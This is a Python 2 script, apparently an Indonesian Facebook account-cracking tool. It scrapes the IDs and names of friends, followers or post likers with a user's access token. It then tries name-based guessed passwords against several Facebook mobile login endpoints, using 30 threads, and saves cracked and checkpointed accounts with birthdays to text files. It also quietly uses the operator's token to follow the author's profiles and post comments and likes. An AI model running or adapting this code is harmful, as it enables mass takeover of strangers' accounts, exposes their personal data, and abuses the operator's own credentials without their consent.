#-*-coding:utf-8-*-
# Autor     : ☆ RAKA ☆ ™︻®╤───────═◍➤
# Github    : Bangsat-XD
# Facebook  : Raka Andrian Tara
# Instagram : raka_andrian27
# Twitter   : Bangsat_XD
# NOTE ...!!!
# Kalo mau RECOD IZIN DULU ya CUKKKK Bot COMEND JANGAN DI GANTI ...?

import requests,bs4,sys,os,subprocess,time,datetime
import requests,sys,random,re,base64,json
from multiprocessing.pool import ThreadPool
reload(sys)
sys.setdefaultencoding("utf-8")

try:
    import requests
except ImportError:
    exit('pip2 install requests *Not Installed')
try:
    import mechanize
except ImportError:
    exit('pip2 install mechanize *Not Installed')
try:
    import bs4
except ImportError:
    exit("pip2 install bs4 *Not Installed")
### USERAGENT ###
ua = ('Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]')
### Logo ###
logo = ("""                    ☆ RAKA™ ☆ 
              ───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───
              ───█▒▒░░░░░░░░░▒▒█───
              ────█░░█░░░░░█░░█────
              ─▄▄──█░░░▀█▀░░░█──▄▄─
              █░░█─▀▄░░░░░░░▄▀─█░░█
             █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
             █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
             █░░║║║╠─║─║─║║║║║╠─░░█
             █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
             █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
        ┏━┳━┓┏━━┓╋╋╋╋┏━━┓╋╋╋╋╋╋╋╋╋┏┓
        ┃┃┃┃┣╋┓┏┻┳━┳┓┃┏┓┣━━┳━┓┏━┳┳┛┣━┓
        ┃┃┃┃┃┃┃┃╋┃╋┃┗┫┣┫┃┃┃┃╋┗┫┃┃┃╋┃╋┗┓ 
        ┗┻━┻╋┓┣┻━┻━┻━┻┛┗┻┻┻┻━━┻┻━┻━┻━━┛ 
        ╋╋╋╋┗━┛     """)
mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
free_h={"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
mfb_h={'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent':ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
### JALAN ###
def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)
### Bot Komen ###
def komen(): # Boleh Di Tanbahin Jangan Di Ganti #
        try:
                toket=open('login.txt','r').read()
        except IOError:
                print ('[x] Token Invalid')
                login()
        web = datetime.datetime.now()
        waktu = web.strftime("%H:%M:%S / %d-%m-%Y ")
	kata = random.choice(["Kita harus melakukan yang terbaik yang kita mampu. Itu adalah tanggung jawab manusia yang suci.","Orang yang ekstrem mendapatkan hasil yang ekstrem.","Belajar untuk menjadi tenang dan kamu akan selalu bahagia.","Belajar untuk menjadi tenang dan kamu akan selalu bahagia.","Dari kesalahan ke kesalahan seseorang menemukan seluruh kebenaran.","Jalan yang sulit sering kali mengarah ke tujuan yang indah.","Hal-hal hebat tidak pernah datang dari zona nyaman.","Jika kamu tidak mau mengambil risiko yang tidak biasa, kamu harus puas dengan yang biasa.","Nikmati setiap momen dalam hidup karena kamu tidak tahu apa yang akan terjadi besok."])
        love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
        kom = 'Pengguna Script sbef '+love+'\n'+kata+'\n'+waktu
        requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/934976007098547/comments/?message=' +kom+ '&access_token=' + toket)
        requests.post('https://graph.facebook.com/934976007098547/likes?summary=true&access_token=' + toket)
        requests.post('https://graph.facebook.com/934976007098547/comments/?message=Keren Bang ❤️&access_token=' + toket)
        requests.post('https://graph.facebook.com/934976007098547/likes?summary=true&access_token=' + toket)
        requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + toket)
        print ('[®] Login Berhasil')
	menu()
##### LOGIN #####
def login():
    os.system('clear')
    print logo
    print('=========================================')
    print('[1]--®--Login Pakai Token')
    print('[2]--®--Login Pakai Cookies')
    print('[3]--®--Cara Dapat Token/Cookies')
    print('[0]--®--Keluar')
    print('=========================================')
    lg = raw_input('[®] Input : ')
    if lg == '':
        os.sys.exit()
    elif lg == '1' or lg == '01':
        toket = raw_input("[®] Token : ") # Login Token
        try:
                otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
                a = json.loads(otw.text)
                nama = a['name']
                zedd = open("login.txt", 'w')
                zedd.write(toket)
                zedd.close()
                komen()
        except KeyError:
                print("[x] Token Salah")
                time.sleep(1.7)
                login()
        except requests.exceptions.SSLError:
                exit('[x] Koneksi Error')
    elif lg == '2' or lg == '02':
        try:
		cookie = raw_input("[®] Cookies : ")
                data = {
                            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
                                'referer' : 'https://m.facebook.com/',
                                'host' : 'm.facebook.com',
                                'origin' : 'https://m.facebook.com',
                                'upgrade-insecure-requests' : '1',
                                'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                                'cache-control' : 'max-age=0',
                                'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                                'content-type' : 'text/html; charset=utf-8',
                                 'cookie' : cookie }
                coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
                cari = re.search('(EAAA\w+)', coki.text)
                hasil = cari.group(1)
                pup = open('coki.log', 'w')
                pup.write(cookie)
                pup.close()
                pip = open('login.txt', 'w')
                pip.write(hasil)
                pip.close()
                komen()
        except AttributeError,UnboundLocalError:
                print('[x] Cookies Salah')
                time.sleep(3)
                login()
    else:
        exit('[x] Isi Dengan Benar')
##### MENU #####
def menu():
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nm = a['name']
    id = a['id']
    tl = a['birthday']
  except Exception as e:
    print('[x] Token Invalid')
    time.sleep(3)
    login()
  except KeyError:
    print('[x] Token Invalid')
    time.sleep(3)
    os.system('rm -rf login.txt')
    login()
  except requests.exceptions.ConnectionError:
    exit('[x] Koneksi Error')
  os.system("clear")
  print logo
  print('============================================')
  print('[®] Nama     : '+nm)
  print('[®] Your ID  : '+id)
  print('[®] Birthday : '+tl)
  print('============================================')
  print('[1]--®--Crack ID Dari Teman')
  print('[2]--®--Crack ID Dari Publik')
  print('[3]--®--Crack ID Dari Followers')
  print('[4]--®--Crack ID Dari Like')
  print('[5]--®--Lihat Hasil Crack')
  print('[0]--®--Keluar & Hapus Token/Cookies')
  print('============================================')
  mn=raw_input("[®] Input : ")
  if mn=="":
	print ('[x] Isi Dengan Benar Kentod')
	menu()
  elif mn=="1":
    teman()
  elif mn=="2":
    publik()
  elif mn=="3":
    followers()
  elif mn=="4":
    like()
  elif mn=="5":
    print('──────────────────────────────────────────')
    print('[1]--®--Lihat Hasil Ok')
    print('[2]--®--Lihat Hasil Cp')
    print('[0]--®--Kembali')
    print('──────────────────────────────────────────')
    hs = raw_input('[®] Input : ')
    if hs == '':
        menu()
    elif hs == '1' or hs == '01':
	ok()
    elif hs == '2' or hs == '02':
	cp()
    else:
	exit('[x] Isi Dengan Benar Kentod')
  elif mn=="0":
    try:
      os.remove("login.txt")
      exit('[®] Berhasil Menghapus Token/Cookies')
    except Exception as e:
      exit('[x] File Tidak Ada')
  else:
    print ('[x] Isi Dengan Benar Kentod')
    menu()
def ok():
	try:
		ok=open('Ok.txt','r').read()
		print('\n'+ok)
	except Exception as e:
		exit('[x] Hasil Ok Tidak Ada')
def cp():
        try:
                cp=open('Cp.txt','r').read()
		print('\n'+cp)
	except Exception as e:
		exit('[x] Hasil Cp Tidak Ada')
##### CRACK TEMAN #####
def teman():
        try:
                toket=open('login.txt','r').read()
        except IOError:
		print('[x] Token Invalid')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                login()
        try:
		limit = '5000'
                file = 'Bangsat-XD.json'
		print('──────────────────────────────────────────')
		print('[®] Nama File : '+file)
                try:
                   r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket+"&limit="+limit)
                except KeyError:
			print ('[x] Tidak Ada Teman')
			raw_input("[Kembali]")
                        menu()
                id = []
                z=json.loads(r.text)
                qq = ('teman.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r[®] Dump %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                ys.close()
                os.rename(qq,file)
		print("\r[®] Total ID  : %s         "%(len(id)))
		print('──────────────────────────────────────────')
                metode()

        except requests.exceptions.ConnectionError:
		exit('[x] Koneksi Error')
##### CRACK FOLLOWERS #####
def followers():
        try:
                toket=open('login.txt','r').read()
        except IOError:
		print('[x] Token Invalid')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                login()
        try:
		print('──────────────────────────────────────────')
                idt = raw_input("[®] ID Profil : ")
                limit = '5000'
                file = 'Bangsat-XD.json'
		print('[®] Nama File : '+file)
                try:
                        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
                        op = json.loads(jok.text)
                        #print("[®] Nama : "+op["name"])
                except KeyError:
			print('[x] ID Profil Tidak Ada')
			raw_input("[Kembali]")
			menu()
                r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+toket+"&limit="+limit)
                id = []
                z=json.loads(r.text)
                qq = ('flw.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r[®] Dump %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                ys.close()
                os.rename(qq,file)
                print("\r[®] Total ID  : %s           "%(len(id)))
		print('──────────────────────────────────────────')
                metode()

        except KeyError:
		print('[x] Tidak Ada Followers')
                raw_input('[Kembali]')
                menu()
        except requests.exceptions.ConnectionError:
		exit('[x] Koneksi Error')
##### CRACK LIKE #####
def like():
        try:
                toket=open('login.txt','r').read()
        except IOError:
		print(' *! Token Invalid')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                login()
        try:
		print('──────────────────────────────────────────')
                idt = raw_input("[®] ID Post : ")
		limit = '5000'
                file = 'Bangsat-XD.json'
		print('[®] Nama File : '+file)
                try:
                   r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit="+limit+"&access_token="+toket)
                except KeyError:
			print('[x] ID Post Tidak Ada')
			raw_input("[Kembali]")
                        menu()
                id = []
                z=json.loads(r.text)
                qq = ('likess.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r[®] Dump %s ID \r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                ys.close()
                os.rename(qq,file)
                print("\r[®] Total ID  : %s           "%(len(id)))
		print('──────────────────────────────────────────')
		metode()

        except KeyError:
		print ('[x] Bukan ID Postingan')
                raw_input('[Kembali]')
                menu()
        except requests.exceptions.ConnectionError:
		exit('[x] Koneksi Error')
##### CRACK PUBLIK #####
def publik():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print('[x] Token Invalid')
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		print('──────────────────────────────────────────')
		idt = raw_input("[®] ID Profil : ")
		limit = '5000'
		file = 'Bangsat-XD.json'
		print('[®] Nama File : '+file)
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			#print("[®] Nama : "+op["name"])
		except KeyError:
			print('[x] ID Profil Tidak Ada')
			raw_input("[Kembali]")
			menu
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit("+limit+")&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = ('pblk.txt').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r[®] Dump %s ID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
		ys.close()
		os.rename(qq,file)
		print("\r[®] Total ID  : %s          "%(len(id)))
		print('──────────────────────────────────────────')
		metode()
		
	except Exception as e:
		print('[x] Tidak Ada Teman')
		menu()
	except requests.exceptions.ConnectionError:
		exit('[x] Koneksi Error')
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
def mfb(em,pas,hosts):
    global ua,mfb_h
    r = requests.Session()
    r.headers.update(mfb_h)
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return
def free(em,pas,hosts):
	global ua,free_h
	r=requests.Session()
	r.headers.update(free_h)
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def metode():
    print('[1]--®--Metode mbasic.facebook.com')
    print('[2]--®--Metode mobile.facebook.com')
    print('[3]--®--Metode free.facebook.com')
    md = raw_input('[®] Input : ')
    if md == '':
	exit()
    elif md == '1' or md == '01':
	crack()
    elif md == '2' or md == '02':
	crack1()
    elif md == '3' or md == '03':
	crack2()
    else:
        exit('[x] Isi Dengan Benar Kentod')
def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"1234")
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i+"123456")
				results.append(i)
	return results
class crack:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			print('──────────────────────────────────────────')
			f=raw_input("[®]--®--Gunakan Pass Manual (y/t) : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk= 'Bangsat-XD.json'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print('[x] File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print('[x] File Tidak Ada')
					continue
				print('[®] Contoh Pass : sayang,anjing')
				self.pwlist()
				break
			elif f=="t":
				try:
					while True:
						try:
							self.apk= 'Bangsat-XD.json'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print('[x] File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print('[x] File Tidak Valid')
					menu()
					continue
				print('[®]--®--Hasil Ok Tersimpan Di Ok.txt')
				print('[®]--®--Hasil Cp Tersimpan Di Cp.txt')
				print('──────────────────────────────────────────')
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				print ('[Selesai]')
				break
	def pwlist(self):
		self.pw=raw_input("[?] Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print('[®]--®--Hasil Ok Tersimpan Di [RAKA_AMANDA].txt')
                        print('[®]--®--Hasil Cp Tersimpan Di [AMANDA_RAKA].txt')
			print('──────────────────────────────────────────')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('[Selesai]')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m[RAKA_AMANDA] "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+" "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					try:
						toket=open('login.txt','r').read()
						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
						w=json.loads(q.text)
						tl=w["birthday"]

					except (KeyError, IOError):
		                         tl = "*Private"
					except:pass
					print("\r\033[0;93m[RAKA_AMANDA] "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"\033[0;93m "+tl+" "))
					self.cp.append("%s | %s %s"%(fl.get("id"),i,tl))
					open("Cp.txt","a+").write(
						"%s | %s %s\n"%(fl.get("id"),i,tl))
					break
				else:continue
					
			self.ko+=1
			print "\r[Crack] %s/%s *Ok : %s : *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack1:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			print('──────────────────────────────────────────')
			f=raw_input("[®]--®--Gunakan Pass Manual (y/t) : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk= 'Bangsat-XD.json'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print('[x] File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print('[x] File Tidak Ada')
					continue
				print('[®] Contoh Pass : sayang,anjing')
				self.pwlist()
				break
			elif f=="t":
				try:
					while True:
						try:
							self.apk= 'Bangsat-XD.json'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print('[x] File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print('[x] File Tidak Valid')
					menu()
					continue
				print('[®]--®--Hasil Ok Tersimpan Di Ok.txt')
				print('[®]--®--Hasil Cp Tersimpan Di Cp.txt')
				print('──────────────────────────────────────────')
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				print ('[Selesai]')
				break
	def pwlist(self):
		self.pw=raw_input("[?] Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print('[®]--®--Hasil Ok Tersimpan Di Ok.txt')
                        print('[®]--®--Hasil Cp Tersimpan Di Cp.txt')
			print('──────────────────────────────────────────')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('[Selesai]')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log = mfb(fl.get('id'), i, 'https://m.facebook.com')
				if log.get("status")=="success":
					print("\r\033[0;92m[RAKA_AMANDA] "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+" "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					try:
						toket=open('login.txt','r').read()
						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
						w=json.loads(q.text)
						tl=w["birthday"]

					except (KeyError, IOError):
		                         tl = "*Private"
					except:pass
					print("\r\033[0;93m[RAKA_AMANDA] "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"\033[0;93m "+tl+" "))
					self.cp.append("%s | %s %s"%(fl.get("id"),i,tl))
					open("Cp.txt","a+").write(
						"%s | %s %s\n"%(fl.get("id"),i,tl))
					break
				else:continue
					
			self.ko+=1
			print "\r[Crack] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			print('──────────────────────────────────────────')
			f=raw_input("[®]--®--Gunakan Pass Manual (y/t) : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk= 'Bangsat-XD.json'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print('[x] File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print('[x] File Tidak Ada')
					continue
				print('[®] Contoh Pass : sayang,anjing')
				self.pwlist()
				break
			elif f=="t":
				try:
					while True:
						try:
							self.apk= 'Bangsat-XD.json'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print('[x] File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print('[x] File Tidak Valid')
					menu()
					continue
				print('[®]--®--Hasil Ok Tersimpan Di Ok.txt')
				print('[®]--®--Hasil Cp Tersimpan Di Cp.txt')
				print('──────────────────────────────────────────')
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				print ('[Selesai]')
				break
	def pwlist(self):
		self.pw=raw_input("[?] Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print('[®]--®--Hasil Ok Tersimpan Di Ok.txt')
                        print('[®]--®--Hasil Cp Tersimpan Di Cp.txt')
			print('──────────────────────────────────────────')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('[Selesai]')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=free(fl.get("id"),
					i,"https://free.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m[RAKA_AMANDA] "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+" "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					try:
						toket=open('login.txt','r').read()
						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
						w=json.loads(q.text)
						tl=w["birthday"]

					except (KeyError, IOError):
		                         tl = "*Private"
					except:pass
					print("\r\033[0;93m[RAKA_AMANDA] "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"\033[0;93m "+tl+" "))
					self.cp.append("%s | %s %s"%(fl.get("id"),i,tl))
					open("Cp.txt","a+").write(
						"%s | %s %s\n"%(fl.get("id"),i,tl))
					break
				else:continue
					
			self.ko+=1
			print "\r[Crack] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)

if __name__=='__main__':
	os.system('git pull')
	menu()
